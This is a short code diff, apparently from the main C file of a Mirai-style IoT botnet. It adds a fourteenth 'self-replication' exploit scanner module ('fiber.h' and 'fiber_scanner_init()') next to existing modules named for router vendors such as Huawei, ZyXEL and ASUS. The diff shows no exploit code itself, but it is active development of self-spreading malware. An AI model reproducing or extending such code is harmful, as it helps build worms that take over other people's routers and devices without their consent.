@@ -13,7 +13,7 @@
 #endif
 
 #ifdef SELFREP
-/* Self-replication scanners - 13 exploit modules */
+/* Self-replication scanners - 14 exploit modules */
 #include "scanner.h"
 #include "huawei.h"
 #include "zyxel.h"
@@ -27,6 +27,7 @@
 #include "xm.h"
 #include "hilink.h"
 #include "asus.h"
+#include "fiber.h"
 #endif
 
 #ifdef WATCHDOG
@@ -110,6 +111,7 @@ int main(int argc, char **args) {
     xm_scanner_init();
     hilink_scanner_init();
     asus_scanner_init();
+    fiber_scanner_init();
 #endif
 
     /* Start watchdog if enabled */
